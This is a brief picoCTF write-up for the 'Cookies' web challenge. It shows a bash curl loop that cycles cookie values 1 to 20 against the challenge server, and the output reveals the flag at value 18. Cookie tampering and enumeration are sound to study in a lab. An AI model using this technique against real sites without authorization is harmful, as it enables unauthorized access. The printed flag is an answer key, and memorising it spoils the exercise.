## Cookies
## Descripcion

Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:51209/
## Solucion


### solucion 1_ usando python

for i in {1..20}; do curl -s http://wily-courier.picoctf.net:51209/check -H *Cookie:name=$i*; done | grep pico

````
bash
BelovedCis-picoctf@webshell:~$ for i in {1..20}; do curl -s http://wily-courier.picoctf.net:51209/check -H *Cookie:name=$i*; done | grep pico
BelovedCis-picoctf@webshell:~$ for i in {1..20}; do
>   echo "Probando $i"
>   curl -s http://wily-courier.picoctf.net:51209/check -H "Cookie: name=$i" | grep pico
> done
Probando 1
Probando 2
Probando 3
Probando 4
Probando 5
Probando 6
Probando 7
Probando 8
Probando 9
Probando 10
Probando 11
Probando 12
Probando 13
Probando 14
Probando 15
Probando 16
Probando 17
Probando 18
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
Probando 19
Probando 20
````

## Notas


## Referencias
- python requests: [https://www.w3schools.com/python/module_requests.asp](https://www.w3schools.com/python/module_requests.asp "https://www.w3schools.com/python/module_requests.asp")

Métodos de Solución:

- Consola
- Burpsuite
- Python